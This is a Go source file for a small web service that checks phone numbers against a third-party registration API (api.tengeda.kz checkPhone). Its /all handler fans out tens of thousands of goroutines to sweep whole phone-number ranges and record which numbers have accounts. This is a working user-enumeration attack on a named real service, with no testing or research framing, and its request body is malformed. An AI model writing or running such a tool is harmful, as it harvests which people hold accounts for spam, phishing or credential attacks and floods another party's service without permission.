package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/gorilla/mux"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"time"
)

func f(i, i2 int) {
	n := time.Now()
	fmt.Println(i, "  =========", i2)
	for i < i2 {
		v := strconv.Itoa(i)
		var jsonData = []byte(fmt.Sprintf(`"body"{"phone":"%s"}`, v))
		s, _ := http.Post("https://api.tengeda.kz/api/json/tengeda/checkPhone", "application/json", bytes.NewBuffer(jsonData))
		var jsonMap map[string]int
		b, _ := ioutil.ReadAll(s.Body)
		json.Unmarshal(b, &jsonMap)
		if jsonMap["code"] == 0 {
			fmt.Println(i, "Not registered")
		} else {
			fmt.Println(i, "Exist")
		}
		i++

	}
	fmt.Println(n, time.Now())
}

func getAll(w http.ResponseWriter, r *http.Request) {
	var jsonMap map[string]int
	b, _ := ioutil.ReadAll(r.Body)
	json.Unmarshal(b, &jsonMap)
	flag.Parse()

	for x := 0; x < 9; x++ {
		var t1, t2 string
		if x > 0 && x < 9 {
			t1 = fmt.Sprintf("7%d0000%d00", jsonMap["code"], x)
			t2 = fmt.Sprintf("7%d0000%d00", jsonMap["code"], x+1)
		}
		i, _ := strconv.Atoi(t1)
		i2, _ := strconv.Atoi(t2)
		fmt.Println("Goroutine:", x, " range: ", x, x+1)
		go f(i, i2)
	}

	for x := 10; x < 99; x++ {
		var t1, t2 string

		t1 = fmt.Sprintf("7%d000%d00", jsonMap["code"], x)
		t2 = fmt.Sprintf("7%d000%d00", jsonMap["code"], x+1)

		i, _ := strconv.Atoi(t1)
		i2, _ := strconv.Atoi(t2)
		fmt.Println("Goroutine:", x, " range: ", x, x+1)
		go f(i, i2)
	}
	for x := 100; x < 999; x++ {
		var t1, t2 string
		if x < 999 && x > 99 {
			t1 = fmt.Sprintf("7%d00%d00", jsonMap["code"], x)
			t2 = fmt.Sprintf("7%d00%d00", jsonMap["code"], x+1)
		}
		i, _ := strconv.Atoi(t1)
		i2, _ := strconv.Atoi(t2)
		fmt.Println("Goroutine:", x, " range: ", x, x+1)
		go f(i, i2)
	}
	for x := 1000; x < 9999; x++ {
		var t1, t2 string
		if x < 9999 && x > 999 {
			t1 = fmt.Sprintf("7%d0%d00", jsonMap["code"], x)
			t2 = fmt.Sprintf("7%d0%d00", jsonMap["code"], x+1)
		}
		i, _ := strconv.Atoi(t1)
		i2, _ := strconv.Atoi(t2)
		fmt.Println("Goroutine:", x, " range: ", x, x+1)
		go f(i, i2)
	}
	for x := 10000; x < 99999; x++ {
		var t1, t2 string
		if x < 99999 && x > 9999 {
			t1 = fmt.Sprintf("7%d%d00", jsonMap["code"], x)
			t2 = fmt.Sprintf("7%d%d00", jsonMap["code"], x+1)
		}
		i, _ := strconv.Atoi(t1)
		i2, _ := strconv.Atoi(t2)
		fmt.Println("Goroutine:", x, " range: ", x, x+1)
		go f(i, i2)
	}
	fmt.Println("Done")
}

func getOne(w http.ResponseWriter, r *http.Request) {
	s, err := http.Post("https://api.tengeda.kz/api/json/tengeda/checkPhone", "application/json", r.Body)
	if err != nil {
		fmt.Print(err)
	}
	var jsonMap map[string]int
	b, _ := ioutil.ReadAll(s.Body)
	json.Unmarshal(b, &jsonMap)
	if jsonMap["code"] == 0 {
		w.Write([]byte("No registered"))
	} else {
		w.Write([]byte("Exists"))
	}
}

func main() {
	router := mux.NewRouter().StrictSlash(true)
	router.HandleFunc("/", getOne).Methods("POST")
	router.HandleFunc("/all", getAll).Methods("POST")
	log.Fatal(http.ListenAndServe(":80", router))
}
